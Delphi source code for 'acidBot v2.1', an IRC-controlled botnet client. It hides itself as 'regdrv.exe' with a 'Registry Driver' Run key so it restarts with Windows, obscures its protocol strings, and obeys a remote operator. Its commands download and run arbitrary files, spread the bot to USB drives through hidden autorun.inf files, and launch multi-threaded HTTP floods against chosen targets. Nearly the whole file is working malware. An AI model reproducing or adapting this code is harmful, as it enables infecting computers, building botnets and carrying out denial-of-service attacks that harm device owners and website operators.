program acidBot2;
// acidBot v2.1 by Acid/HuckJam
// This bot was made to show that Delphi
// is perfectly fine for bots too.

// Credits to Aphex for his TThread & ApplicationUnit.

uses
  Windows,
  WinSock,
  ShellAPI,
  abEncryption,
  abFunctions,
  abWinsock,
  abThreads,
  abApplication,
  abHTTPFlood;

var
  IRCDInfo: array[1..4] of String = ('10.0.0.3', '32828', '#kewl', '');
  FileInfo: array[1..4] of String = ('regdrv.exe', 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Registry Driver', 'aB2-Mutex');
  AuthInfo: array[1..3] of String = ('*!*@*', 'mypassword', '!');
  BotComnd: array[1..11] of String = ('login', 'logout', 'uninstall', 'die', 'version', 'sysinfo', 'opensite', 'download', 'spread', 'httpflood', 'httpfloodstop');
  IRCProto: array[1..7] of String = ('ÓÊÍÄ', 'ÈÊÀÈ', 'éìêí', 'öðæñ', 'íêàè', '““’', 'óñêõîðä');

var
  Application: TApplication;
  ircSocket: TClientSocket;
  GetPath, AuthName, BotName, Master, Target: String;
  Port: Integer;
  Mutex: Cardinal;
  LoggedIn, PrivateMsg, Spread, Flooding: Boolean;

procedure DecryptStrings();
var
  I: Integer;
begin
  for I := 1 to 7 do IRCProto[I] := Decrypt(IRCProto[I]);
end;

procedure SendMessage(Msg: String);
begin
  if PrivateMsg then ircSocket.SendString(IRCProto[7] + ' ' + Master + ' :' + Msg + #10#13) else
  ircSocket.SendString(IRCProto[7] + ' ' + IRCDInfo[3] + ' :' + Msg + #10#13);
end;

procedure HTTPFloodThread();
var
  httpSocket: TClientSocket;
  Site: String;
begin
  httpSocket := TClientSocket.Create;
  while Flooding do
  begin
    httpSocket.Connect(Target, Port);
    if httpSocket.Connected then
    begin
      Site := 'http://' + Target;
      httpSocket.SendString(CreateHTTPRequest(Site));
      httpSocket.Disconnect;
      Sleep(1);
      Application.ProcessMessages;
    end;
  end;
  httpSocket.Free;
end;

procedure SpreadUSB();
var
  Drive: Char;
  Path: String;
  AutoStart: TextFile;
begin
  while Spread do
  begin
    for Drive := 'B' to 'Z' do
    begin
      if GetDriveType(PChar(Drive + ':\')) = DRIVE_REMOVABLE then
      begin
        Path := Drive + ':\' + FileInfo[1];
        if FileExists(Path) = False then
        begin
          CopyFile(PChar(ParamStr(0)), PChar(Path), False);
          SetFileAttributes(PChar(Path), FILE_ATTRIBUTE_HIDDEN);
          AssignFile(AutoStart, Drive + ':\' + 'autorun.inf');
          ReWrite(AutoStart);
          WriteLn(AutoStart, '[autorun]');
          WriteLn(AutoStart, 'open=' + FileInfo[1]);
          CloseFile(AutoStart);
          SetFileAttributes(PChar(Drive + ':\' + 'autorun.inf'), FILE_ATTRIBUTE_HIDDEN);
          SendMessage('[Spread] Device found, file dropped.');
        end;
      end;
    end;
    Sleep(30000);
  end;
end;

procedure Install(Uninstall: Integer);
begin
  if Uninstall = 0 then
  begin
    if MatchStrings(ParamStr(0), GetPath) = False then
    begin
      CopyFile(PChar(ParamStr(0)), PChar(GetPath), False);
      ExecuteFile(GetPath);
      ExitProcess(0);
    end else InsertRegValue(HKEY_CURRENT_USER, FileInfo[2], FileInfo[3], GetPath);
  end else
  if Uninstall = 1 then
  begin
    DeleteRegValue(HKEY_CURRENT_USER, FileInfo[2], FileInfo[3]);
    DeleteSelf(ParamStr(0));
    ExitProcess(0);
  end;
end;

procedure ParseIRC(RawData: String);
var
  Trimmed: String;
  Param: array[1..4] of String;
  RawDataBack: String;
  I: Integer;
begin
  if (CheckAuthHost(AuthInfo[1], RawData)) and (Pos(IRCProto[7], RawData) > 0) then
  begin
    RawDataBack := RawData;
    Delete(RawDataBack, 1, 1);
    Master := Copy(RawDataBack, 1, Pos('!', RawDataBack) - 1);
    if Pos(BotName, RawDataBack) > 7 then PrivateMsg := True else PrivateMsg := False;
    if PrivateMsg then Delete(RawDataBack, 1, Pos(BotName + ' :', RawDataBack) + Length(BotName) + 1) else
    Delete(RawDataBack, 1, Pos(IRCDInfo[3] + ' :', RawDataBack) + Length(IRCDInfo[3]) + 1);
    Trimmed := TrimEx(RawDataBack);
    if LeftStr(Trimmed, 1) = AuthInfo[3] then
    begin
      Delete(Trimmed, 1, 1);

      //This is a cheap method so we don't need to make a TStringList replacement.
      //There might be a better way but this is what I chose.
      Param[1] := Split(Trimmed, ' ', 1);
      Param[2] := Split(Trimmed, ' ', 2);
      Param[3] := Split(Trimmed, ' ', 3);
      Param[4] := Split(Trimmed, ' ', 4);

      if Param[1] = BotComnd[1] then
      begin
        if Param[2] = AuthInfo[2] then
        begin
          if LeftStr(RawData, 25) <> AuthName then
          begin
            LoggedIn := True;
            AuthName := LeftStr(RawData, 25);
            SendMessage('Welcome Master!');
          end;
        end;
      end;

      if LoggedIn = True then
      begin
        if Param[1] = BotComnd[2] then
        begin
          LoggedIn := False;
          AuthName := '';
          SendMessage('I will wait for you master!');
        end;
      end;

      if (LoggedIn = True) and (AuthName = LeftStr(RawData, 25)) then
      begin
        if Trimmed = BotComnd[3] then Install(1);
        if Trimmed = BotComnd[4] then ExitProcess(0);
        if Trimmed = BotComnd[5] then SendMessage('acidBot v2.1');
        if Trimmed = BotComnd[6] then SendMessage('OS: ' + GetWinVersion + ', Processor: ' + GetProcessorName + ', RAM: ' + GetTotalRAM + ', GFX Card: ' + GetVideoCard + ', System Uptime: ' + GetUptime);

        if Param[1] = BotComnd[7] then
        begin
          ShellExecute(0, 'open', PChar(Param[2]), '', '', SW_SHOW);
          SendMessage('The website have been opened.');
        end;

        if Param[1] = BotComnd[8] then
        begin
          SendMessage('Attempting to download ' + Param[2]);
          if Download(Param[2], Param[3]) then
          begin
            if Param[4] <> '1' then SendMessage('Download Complete!');
            if Param[4] = '1' then
            begin
              ExecuteFile(Param[3]);
              SendMessage('File Downloaded & Executed!');
            end;
          end else SendMessage('Download Failed!');
        end;

        if Param[1] = BotComnd[9] then
        begin
          if Param[2] = 'on' then
          begin
            Spread := True;
            TThread.Create(@SpreadUSB, 0);
            SendMessage('[Spread] Spreading ON.');
          end else
          if Param[2] = 'off' then
          begin
            Spread := False;
            SendMessage('[Spread] Spreading OFF.');
          end;
        end;

        if Param[1] = BotComnd[10] then
        begin
          Flooding := True;
          if Pos('http://', Param[2]) > 0 then Delete(Param[2], 1, 7);
          if RightStr(Param[2], 1) = '/' then Delete(Param[2], Length(Param[2]), 1);
          Target := Param[2];
          Port := StrToInt(Param[3]);
          for I := 0 to 20 do TThread.Create(@HTTPFloodThread, 0);
          SendMessage('[HTTPFlood] Started on ' + Target);
        end;

        if Param[1] = BotComnd[11] then
        begin
          Flooding := False;
          SendMessage('[HTTPFlood] Stopped.');
        end;

      end;
    end;
  end;
end;

procedure RecieveData(Thread: TThread; Socket: TClientSocket);
var
 Data, Temp: String;
 NonBlocking: Integer;
begin
 NonBlocking := 1;
 IoCtlSocket(Socket.Socket, FIONBIO, NonBlocking);
 while Socket.Connected do
 begin
  Data := Socket.ReceiveString;
  if Length(Data) > 0 then
  begin
    while(Pos(#10, Data) <> 0) do
    begin
      Temp := Copy(Data, 1, Pos(#10, Data) - 1);
      Delete(Data, 1, Pos(#10, Data));
      ParseIRC(Temp);
      if Pos(IRCProto[6], Temp) > 0 then ircSocket.SendString(IRCProto[3] + ' ' + IRCDInfo[3] + ' ' + IRCDInfo[4] + #10#13);
      if (Pos(IRCProto[2], LowerCase(Temp)) > 0) and (Pos(IRCProto[7], Temp) = 0)then ircSocket.SendString(IRCProto[3] + ' '  + IRCDInfo[3] + ' ' + IRCDInfo[4] + #10#13);
      if (Pos(IRCProto[1], LowerCase(Temp)) > 0) and (Pos(IRCProto[7], Temp) = 0) then ircSocket.SendString(ReplaceString(Temp, IRCProto[1], 'pong') + #10#13);
    end;
    if Temp <> '' then Temp := '';
    Data := '';
  end;
  Sleep(1);
  Application.ProcessMessages;
 end;
 Socket.Disconnect;
 Socket.Free;
end;

procedure CreateConnection(Thread: TThread);
begin
 while 0 < 1 do
 begin
   ircSocket := TClientSocket.Create;
   ircSocket.Connect(IRCDInfo[1], StrToInt(IRCDInfo[2]));
   if ircSocket.Connected then
   begin
     Randomize;
     BotName := '[' + GetWinLang + '|' + IntToStr(100000000 + Random(899999999)) + ']';
     ircSocket.SendString(IRCProto[4] + ' acidBot acidBot acidBot acidBot ' + #10#13);
     ircSocket.SendString(IRCProto[5] + ' ' + BotName + #10#13);
     RecieveData(Thread, ircSocket);
   end;
   Sleep(5000);
 end;
end;

begin
  GetPath := GetAppDataPath + FileInfo[1];
  DecryptStrings();
  Install(0);
  Mutex := CreateMutex(nil, True, PChar(FileInfo[4]));
  if (Mutex = 0) or (GetLastError = ERROR_ALREADY_EXISTS) then ExitProcess(0);
  DeleteFile('~SystemCache.bat');
  if MatchStrings(ParamStr(0), GetPath) then
  TThread.Create(@CreateConnection, 0);
  Application := TApplication.Create;
  while 0 < 1 do
  begin
    Sleep(1);
    Application.ProcessMessages;
  end;
end.
